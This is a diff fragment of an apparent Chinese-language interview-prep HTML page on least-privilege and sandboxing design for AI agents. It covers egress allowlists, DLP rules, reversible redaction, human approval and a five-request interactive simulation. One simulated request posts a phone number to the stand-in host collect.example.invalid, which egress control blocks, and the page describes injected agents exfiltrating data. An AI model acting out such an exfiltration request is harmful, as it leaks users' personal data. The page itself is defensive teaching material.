+            "bind": "/workspace",
+            "mode": "rw",
+        },
+    },
+)
+# 执行后立即销毁</code></pre>
+      <p>配置里的四个数字值得记住：<code>network_mode="none"</code>、只读根文件系统、256MB 内存、30 秒超时。它们分别对应网络、文件、内存、时间四类逃逸面。</p>
+      <p class="source-footnote">沙箱技术与具体参数按原文 2026-10 口径保留；本页不启动容器、不执行代码。</p>
+    </div>
+  </section>
+
+  <section class="reading" aria-labelledby="lp-egress-title">
+    <div class="reading-header">
+      <div><p class="eyebrow">四 · 出口控制与可逆脱敏</p><h2 id="lp-egress-title">数据出不去，<br>任务还能继续。</h2></div>
+      <p class="reading-intro">沙箱挡住执行环境，出口控制挡住数据外流。可逆脱敏再解决一个工程问题：模型需要看到“某个手机号”，但不该看到真值。</p>
+    </div>
+    <div class="prose">
+      <h3>出口控制的两道检查</h3>
+      <p>第一道是域名白名单：只允许 <code>api.openai.com</code>、<code>api.anthropic.com</code>、<code>company-internal-api.com</code> 这类目标。第二道是 DLP：PII 默认脱敏，API key 与内部 URL 默认阻断。顺序是先查目的地，再扫内容；目的地不合法时不必再看 payload。</p>
+      <p>原文的 DLP 规则是三条：<code>{"type": "pii", "action": "redact"}</code>、<code>{"type": "api_key", "action": "block"}</code>、<code>{"type": "internal_url", "action": "block"}</code>。脱敏与阻断要分开：日志可以脱敏，密钥必须阻断。</p>
+
+      <h3>为什么 [REDACTED] 不够</h3>
+      <p>不可逆的 <code>[REDACTED]</code> 适合日志，不适合 Agent 工作流。模型可能在下一次工具调用里引用这个值，比如把手机号填进表单，抹掉后任务直接断掉；两个不同手机号都变成同一个占位符，模型也无法区分。</p>
+      <p>可逆脱敏把真值换成 <code>&lt;PHONE_1&gt;</code>，映射表只存在执行侧。进模型前替换，模型输出和工具参数里的占位符在执行前还原。模型看到的是符号，功能链路不受影响。</p>
+      <div class="lp-redact"><b>固定文本示例（不执行）：</b><br>原始：联系 13812345678，邮箱 alice@example.com<br>进模型：联系 &lt;PHONE_1&gt;，邮箱 &lt;EMAIL_1&gt;<br>执行前还原：send_sms(to='13812345678')</div>
+      <p>格式校验场景（手机号位数、银行卡 Luhn 校验）用格式保留脱敏：保留前后几位，或生成同格式假值。前者不可逆，只用于展示；后者要登记回真值，校验通过后再换回来。</p>
+
+      <h3>数据分级决定处理方式</h3>
+      <div class="table-wrap">
+        <table class="data lp-classify">
+          <caption class="sr-only">四级数据敏感度对应的进模型与出网策略</caption>
+          <thead><tr><th scope="col">级别</th><th scope="col">进模型</th><th scope="col">出网</th></tr></thead>
+          <tbody>
+            <tr><th scope="row">公开</th><td>原文</td><td>允许</td></tr>
+            <tr><th scope="row">内部</th><td>原文</td><td>白名单</td></tr>
+            <tr><th scope="row">敏感</th><td>脱敏</td><td>脱敏</td></tr>
+            <tr><th scope="row">机密</th><td>阻断</td><td>阻断</td></tr>
+          </tbody>
+        </table>
+      </div>
+      <div class="lp-warn">
+        <p class="lp-warn-label">边界要讲清楚</p>
+        <p>脱敏降低泄露面，不替代权限控制。有权限的人误用数据，脱敏拦不住；反过来，只做权限不做出口控制，被注入的 Agent 仍可能把读到的数据发出去。两者是不同层，不能互相替代。</p>
+      </div>
+      <p class="source-footnote">手机号、邮箱与银行卡示例均为固定虚构文本，不调用正则、不执行脱敏代码、不接触真实数据。</p>
+    </div>
+  </section>
+
+  <section class="reading" aria-labelledby="lp-arch-title">
+    <div class="reading-header">
+      <div><p class="eyebrow">五 · 完整安全架构</p><h2 id="lp-arch-title">每一跳都有门，<br>结果才回灌。</h2></div>
+      <p class="reading-intro">原文的完整链路是：输入护栏 → Agent 推理 → 是否需要工具 → 策略引擎（OPA / Cedar）→ 是否授权 → 是否高风险 → 人工审批 → 沙箱执行 → 出口控制 → 结果回灌。</p>
+    </div>
+    <div class="prose">
+      <div class="lp-flow">
+        <div class="lp-flow-row"><b>入口</b><p>用户请求先过输入护栏，再进入 Agent 推理。</p></div>
+        <div class="lp-flow-row"><b>分支</b><p>不需要工具 → 输出护栏 → 返回用户；需要工具 → 进入权限策略引擎。</p></div>
+        <div class="lp-flow-row"><b>授权</b><p>OPA / Cedar 评估 agent、action、context、user permissions。不授权 → 拒绝。</p></div>
+        <div class="lp-flow-row"><b>审批</b><p>授权但属于高风险 → 人工审批；批准后才进入沙箱。</p></div>
+        <div class="lp-flow-row"><b>执行</b><p>沙箱执行，出口控制检查目的地与 payload；结果回灌 Agent，继续推理。</p></div>
+      </div>
+      <p>这张图的关键不是节点多，而是顺序：授权在沙箱前，沙箱在出口前，出口在结果回灌前。任何一步跳过，后面的门都补不回来。</p>
+
+      <details>
+        <summary>查看原文完整安全架构 Mermaid 源码（离线仅作文本）</summary>
+        <pre><code>flowchart TD
+    A["用户请求"] --&gt; IN["输入护栏"]
+    IN --&gt; AG["Agent 推理"]
+    AG --&gt; Q1{"需要调用工具？"}
+    Q1 -- "否" --&gt; R["输出护栏，返回用户"]
+    Q1 -- "是" --&gt; PE["权限策略引擎&lt;br/&gt;OPA / Cedar"]
+    PE --&gt; Q2{"授权？"}
+    Q2 -- "否" --&gt; DEN["拒绝"]
+    Q2 -- "是" --&gt; Q3{"高风险？"}
+    Q3 -- "是" --&gt; HITL["人工审批"]
+    HITL -- "批准" --&gt; SBX["沙箱执行"]
+    Q3 -- "否" --&gt; SBX
+    SBX --&gt; EG["出口控制"]
+    EG -- "结果回灌，继续推理" --&gt; AG
+    classDef proc fill:#e3f2fd,stroke:#1565c0,color:#0d47a1
+    classDef decision fill:#fffde7,stroke:#f9a825,color:#795548
+    classDef agent fill:#f3e5f5,stroke:#6a1b9a,color:#4a148c
+    class A,IN,PE,SBX,EG,R proc
+    class Q1,Q2,Q3,HITL,DEN decision
+    class AG agent</code></pre>
+        <p class="source-footnote">源码按原文保留，仅做 HTML 转义；上方五段流程是同一架构的离线可读呈现。</p>
+      </details>
+    </div>
+  </section>
+
+  <section class="reading" aria-labelledby="lp-mis-title">
+    <div class="reading-header">
+      <div><p class="eyebrow">常见误区 / 面试追问</p><h2 id="lp-mis-title">两个误区，<br>两个追问。</h2></div>
+      <p class="reading-intro">按原文顺序保留 4 条：前两条是误区，后两条是追问。第一条里的 Agents Rule of Two 是本页最重要的设计准则。</p>
+    </div>
+    <div class="misconception">
+      <p class="misconception-label">误区 1</p>
+      <div><h3>“给 Agent 全部权限，让它自己判断用哪些。”</h3><p>这是最危险的做法。Agent 被 Prompt Injection 后，“判断”会被攻击者控制。权限必须在 Agent 外部强制执行。Meta 的 Agents Rule of Two（2025-10）：在注入检测尚不可靠之前，单个会话不应同时具备 [A] 处理不可信输入、[B] 访问敏感数据、[C] 改变状态或对外通信，最多同时具备两个。三者必须俱全时，拆两阶段会话、用沙箱阻断 C，或加可信内容过滤器降低 A。该原则源于 Willison 的致命三角（078）。</p></div>
+    </div>
+    <div class="misconception">
+      <p class="misconception-label">误区 2</p>
+      <div><h3>“沙箱会严重影响性能。”</h3><p>现代容器与 microVM（如 Firecracker）的启动延迟已到毫秒级；gVisor 的性能开销在多数场景下低于 10%。对 Agent 来说，LLM 调用本身 1–5 秒的延迟远大于沙箱开销。</p></div>
+    </div>
+    <div class="misconception">
+      <p class="misconception-label">追问 1</p>
+      <div><h3>“如何处理 Agent 需要临时提升权限的场景？”</h3><p>用 JIT 权限提升：Agent 请求临时权限 → 策略引擎评估 → 需要时人工审批 → 授予限时令牌（如 5 分钟后自动撤销）。避免永久提权，也避免把高权限令牌写进长期配置。</p></div>
+    </div>
+    <div class="misconception">
+      <p class="misconception-label">追问 2</p>
+      <div><h3>“多 Agent 系统中如何防止权限提升链？”</h3><p>四条：Agent 间通信经过统一策略网关；每个 Agent 有独立权限域，不能继承他人权限；消息传递时剥离权限上下文；监控异常的 Agent 间调用模式。核心是取消默认信任，而不是让上层 Agent “判断得更准”。</p></div>
+    </div>
+  </section>
+
+  <section class="source-section" aria-labelledby="lp-related-title">
+    <p class="eyebrow">相关阅读与参考</p>
+    <h2 class="source-heading" id="lp-related-title">继续深入</h2>
+    <p class="source-summary">相关页面按当前仓库进度列出；外链只有主动点击才会离开本页。</p>
+    <details>
+      <summary>展开相关阅读（5 条）</summary>
+      <div class="source-content">
+        <ul>
+          <li><a href="078-agent-safety-risks.html">078 Agent 安全风险</a>：致命三角与风险全景。</li>
+          <li><a href="079-guardrails-basics.html">079 Guardrails 基础</a>：输入、输出与工具调用护栏。</li>
+          <li><a href="082-hallucination-detection.html">082 幻觉检测</a>：输出侧的事实性检查。</li>
+          <li><a href="../03-tool-use/030-tool-use-security.html">030 工具使用安全</a>：工具调用层的攻击面。</li>
+          <li><a href="../03-tool-use/024-tool-gateway-permissions.html">024 工具网关与权限</a>：工具网关的权限设计。</li>
+        </ul>
+      </div>
+    </details>
+
+    <details>
+      <summary>展开原文参考链接（5 条）</summary>
+      <div class="source-content">
+        <ul>
+          <li><a href="https://cheatsheetseries.owasp.org/cheatsheets/AI_Agent_Security_Cheat_Sheet.html" target="_blank" rel="noopener noreferrer">AI Agent Security Cheat Sheet（OWASP）</a></li>
+          <li><a href="https://skywork.ai/blog/ai-agent/hardening-best-practices-sandboxing-least-privilege-data-exfiltration/" target="_blank" rel="noopener noreferrer">Hardening Best Practices: Sandboxing, Least Privilege &amp; Data Exfiltration Guards（Skywork AI）</a></li>
+          <li><a href="https://www.strata.io/blog/why-agentic-ai-forces-a-rethink-of-least-privilege/" target="_blank" rel="noopener noreferrer">Why Agentic AI Forces a Rethink of Least Privilege（Strata.io）</a></li>
+          <li><a href="https://www.infoq.com/articles/building-ai-agent-gateway-mcp/" target="_blank" rel="noopener noreferrer">Building a Least-Privilege AI Agent Gateway with MCP, OPA, and Ephemeral Runners（InfoQ）</a></li>
+          <li><a href="https://www.ibm.com/think/tutorials/ai-agent-security" target="_blank" rel="noopener noreferrer">AI Agent Security Best Practices and Tutorial（IBM）</a></li>
+        </ul>
+        <p class="source-footnote">这些链接按原文保留，不表示本页已核验外部文章。只有主动点击外链才会离开本页。</p>
+      </div>
+    </details>
+  </section>
+</main>
+    <footer><span>Agent-Interview-100 · <code>09-safety-and-alignment/081-least-privilege-sandboxing.md</code></span><span>原文 <code>03d6f0c</code> · 模板 v1 · 第 6 批 · 离线单文件</span></footer>
+  </div>
+<script>
+  "use strict";
+  const LP_REQUESTS = Object.freeze([
+    {
+      title: "研究 Agent 读取内部文档",
+      role: "research_agent",
+      action: "read_document",
+      params: "doc_id = policy-2026",
+      permission: "allow",
+      permissionLabel: "允许",
+      reason: "read_document 在 research_agent 的工具白名单内；只读、不改变状态。",
+      token: "<b>令牌范围：</b>仅 read_document；TTL 60 秒；资源上限 20 次调用 / $1 / 120 秒。",
+      full: "<b>如果给全权限：</b>write_file、send_email、database_write 也会同时可用。一次注入就可能把“读书”变成“外发”。",
+      checks: [
+        ["沙箱", "容器执行，network=none，根文件系统只读，内存 256MB，超时 30 秒。", "ok", "隔离"],
+        ["文件", "只挂载文档读取目录，不挂载可写工作区。", "ok", "只读"],
+        ["出口", "无外发动作；结果回灌 Agent。", "ok", "不适用"],
+        ["结果", "返回文档内容，任务继续。", "ok", "已执行"]
+      ],
+      outcome: "ok",
+      outcomeText: "结果：在只读沙箱中读取文档，结果回灌 Agent；没有写操作，也没有外发。"
+    },
+    {
+      title: "代码 Agent 写工作区文件",
+      role: "code_agent",
+      action: "write_file",
+      params: "path = /workspace/main.py",
+      permission: "allow",
+      permissionLabel: "允许",
+      reason: "write_file 在 code_agent 白名单内；路径限定在 /workspace，不触碰系统目录。",
+      token: "<b>令牌范围：</b>仅 write_file 且 path 前缀 /workspace；TTL 60 秒；20 次调用 / $1 / 120 秒。",
+      full: "<b>如果给全权限：</b>send_email、database_delete、deploy 也会开放。写文件本身不致命，危险的是同一会话里还能部署或外发。",
+      checks: [
+        ["沙箱", "容器执行，根文件系统只读，只有 /workspace 可写。", "ok", "隔离"],
+        ["文件", "路径校验通过：/workspace/main.py 在允许前缀内。", "ok", "通过"],
+        ["出口", "network=none，无外发。", "ok", "不适用"],
+        ["结果", "写入工作区副本，容器销毁后按需保留产物。", "ok", "已执行"]
+      ],
+      outcome: "ok",
+      outcomeText: "结果：写入沙箱内的工作区，未触碰宿主；执行后可销毁容器，产物按策略回收。"
+    },
+    {
+      title: "代码 Agent 发送邮件",
+      role: "code_agent",
+      action: "send_email",
+      params: "to = user@example.com",
+      permission: "deny",
+      permissionLabel: "拒绝",
+      reason: "send_email 不在 code_agent 的工具白名单内。角色只允许 read_file、write_file、run_tests；外发能力被显式拒绝。",
+      token: "<b>令牌：</b>不颁发。权限拒绝发生在策略引擎，未进入沙箱。",
+      full: "<b>如果给全权限：</b>这封邮件会直接发出。若 Agent 已被注入，收件人与正文都可能由攻击者控制。",
+      checks: [
+        ["沙箱", "未进入沙箱：权限阶段已拒绝。", "bad", "未执行"],
+        ["文件", "不适用。", "bad", "未执行"],
+        ["出口", "不适用：没有产生外发请求。", "bad", "未执行"],
+        ["结果", "返回拒绝原因给 Agent，任务改走其他路径或升级人工。", "bad", "已拒绝"]
+      ],
+      outcome: "bad",
+      outcomeText: "结果：动作未执行。权限拒绝发生在工具调用前，这是最便宜的一道门。"
+    },
+    {
+      title: "客服 Agent 外发客户数据",
+      role: "support_agent",
+      action: "http_post",
+      params: "url = https://collect.example.invalid\nbody = phone=13800000000",
+      permission: "allow",
+      permissionLabel: "允许（工具层）",
+      reason: "http_post 在 support_agent 白名单内，权限层允许。但“工具允许”不等于“出口允许”，下一层还要检查目的地与内容。",
+      token: "<b>令牌范围：</b>http_post；TTL 60 秒；目的域仍需通过出口白名单。",
+      full: "<b>如果给全权限：</b>权限层不会拦，但出口控制仍然应该拦。若连出口控制也省掉，手机号就被发出去了。",
+      checks: [
+        ["沙箱", "容器执行，网络按 allowlist 放行。", "ok", "隔离"],
+        ["目的地", "collect.example.invalid 不在域名白名单 → 拦截。", "bad", "拦截"],
+        ["DLP", "payload 命中 phone 规则 → 拦截（不是脱敏，因为目标是未知域）。", "bad", "拦截"],
+        ["结果", "请求未发出；拒绝原因回灌 Agent，提示改用内部接口。", "bad", "已阻断"]
+      ],
+      outcome: "bad",
+      outcomeText: "结果：权限层放行，但出口控制拦住了。固定教学模拟，示例域名与手机号均为虚构，没有发出任何请求。"
+    },
+    {
+      title: "运维 Agent 删除数据库记录",
+      role: "ops_agent",
+      action: "database_delete",
+      params: "table = orders, id = 1042",
+      permission: "approval",
+      permissionLabel: "需人工审批",
+      reason: "database_delete 属于高风险工具。策略引擎不直接拒绝，而是把动作和参数转给人工确认；批准后颁发限时令牌。",
+      token: "<b>令牌：</b>审批前不颁发；批准后限时 5 分钟，仅覆盖这一条记录。",
+      full: "<b>如果给全权限：</b>删除会直接执行。数据库删除通常不可逆，这正是高风险操作必须走审批的原因。",
+      checks: [
+        ["审批", "等待人工确认：表、记录 ID、影响行数都展示给审批人。", "warn", "待审批"],
+        ["沙箱", "审批通过后才进入沙箱；当前未执行。", "warn", "未进入"],
+        ["出口", "删除是内部写操作，不走外网；仍记录审计日志。", "warn", "不适用"],
+        ["结果", "未执行；批准后限时执行，超时自动失效。", "warn", "暂停"]
+      ],
+      outcome: "warn",
+      outcomeText: "结果：动作暂停，等待人工审批。固定教学模拟，没有连接数据库，也没有删除任何记录。"
+    }
+  ]);
+
+  const lpState = { index: 0, phase: 0 };
+  const lpById = (id) => document.getElementById(id);
+
+  function lpRender(announce = true) {
+    const item = LP_REQUESTS[lpState.index];
+    lpById("lp-index").textContent = `请求 ${lpState.index + 1} / 5 · 步骤 ${lpState.phase + 1} / 3`;
+    lpById("lp-title-text").textContent = item.title;
+    lpById("lp-request").textContent = `role: ${item.role}\naction: ${item.action}\nparams: ${item.params}`;
+
+    const permission = lpById("lp-permission");
+    const exec = lpById("lp-exec");
+    permission.hidden = lpState.phase < 1;
+    exec.hidden = lpState.phase < 2;
+    lpById("lp-hidden").hidden = lpState.phase > 0;
+
+    if (lpState.phase >= 1) {
+      lpById("lp-verdict").innerHTML = `<span class="lp-badge ${item.permission === "allow" ? "ok" : item.permission === "deny" ? "bad" : "warn"}">${item.permissionLabel}</span><span class="lp-badge">策略引擎 · OPA / Cedar</span>`;
+      lpById("lp-reason").textContent = item.reason;
+      lpById("lp-token").innerHTML = item.token;
+      lpById("lp-full").innerHTML = item.full;
+    }
+
+    if (lpState.phase >= 2) {
+      lpById("lp-checks").innerHTML = item.checks.map(([name, text, status, label]) =>
+        `<div class="lp-check"><b>${name}</b><p>${text}</p><span class="${status}">${label}</span></div>`
+      ).join("");
+      const outcome = lpById("lp-outcome");
+      outcome.className = "lp-outcome " + item.outcome;
+      outcome.textContent = item.outcomeText;
+    }
+
+    document.querySelectorAll("[data-req]").forEach((button) => {
+      button.setAttribute("aria-pressed", String(Number(button.dataset.req) === lpState.index));
+    });
+    lpById("lp-back").disabled = lpState.phase === 0;
+    const next = lpById("lp-next");
+    if (lpState.phase === 0) {
+      next.textContent = "判定权限";
+      next.disabled = false;
+    } else if (lpState.phase === 1) {
+      next.textContent = "查看沙箱与出口";
+      next.disabled = false;
+    } else {
+      next.textContent = "本请求已完成";
+      next.disabled = true;
+    }
+    lpById("lp-state").textContent = `请求 ${lpState.index + 1} / 5 · 步骤 ${lpState.phase + 1} / 3 · ${item.action}`;
+    if (announce) {
+      lpById("lp-announcement").textContent = `请求 ${lpState.index + 1}，${item.title}，步骤 ${lpState.phase + 1}。${lpState.phase >= 1 ? item.permissionLabel + "。" + item.reason : ""}${lpState.phase >= 2 ? " " + item.outcomeText : ""}`;
+    }
+  }
+
+  document.querySelectorAll("[data-req]").forEach((button) => {
+    button.addEventListener("click", () => {
+      lpState.index = Number(button.dataset.req);
+      lpState.phase = 0;
+      lpRender(false);
+      lpById("lp-announcement").textContent = `已切换请求 ${lpState.index + 1}：${LP_REQUESTS[lpState.index].title}。尚未判定。`;
+    });
+  });
+  lpById("lp-next").addEventListener("click", () => {
+    if (lpState.phase < 2) {
+      lpState.phase += 1;
+      lpRender();
+    }
+  });
+  lpById("lp-back").addEventListener("click", () => {
+    if (lpState.phase > 0) {
+      lpState.phase -= 1;
+      lpRender();
+    }
+  });
+  lpById("lp-reset").addEventListener("click", () => {
+    lpState.index = 0;
+    lpState.phase = 0;
+    lpRender(false);
+    lpById("lp-announcement").textContent = "已重新开始，回到请求 1，尚未判定。";
+  });
+
+  lpRender(false);
+</script>
+</body>
+</html>
